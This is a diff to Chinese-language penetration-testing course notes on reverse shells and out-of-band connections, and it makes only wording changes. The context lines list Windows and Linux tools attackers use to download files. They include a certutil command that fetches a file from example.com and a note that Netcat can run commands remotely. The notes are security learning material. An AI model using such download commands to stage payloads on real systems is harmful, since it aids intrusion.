@@ -18,7 +18,7 @@ Day05 基础入门-反弹SHELL&不回显带外&正反向连接&防火墙出入�
 Linux : wget curl python rubyperl java等  
 Windows : PowerShell Certutil Bitsadmin msiexec mshta rundll32等
 
-Certutil本质是一个管理证书、证书服务和密钥存储的工具，不过黑客们被玩坏了，可以用这个来下载文件。
+Certutil本质是一个管理证书、证书服务和密钥存储的工具，不过被黑客们玩坏了，可以用这个来下载文件。
 certutil.exe -urlcache -split -f <http://example.com/file.txt> file.txt
 
 #实用案例2:反弹shell命令-解决数据回显&解决数据通讯命令生成:  
@@ -27,8 +27,7 @@ certutil.exe -urlcache -split -f <http://example.com/file.txt> file.txt
 # Netcat
 
 ### 介绍
-（简称nc）一款功能强大的网络工具，在网络管理、渗透测试以及安全评估等领域有着广泛应用，常被称为 “网络瑞士军刀”。  
-Netcat 可以用于远程执行命令。  
+（简称nc）一款功能强大的网络工具，在网络管理、渗透测试以及安全评估等领域有着广泛应用，常被称为 “网络瑞士军刀”。Netcat 可以用于远程执行命令。  
 ### 下载
 可在此处下载Windows版本的Netcat  
 <https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>
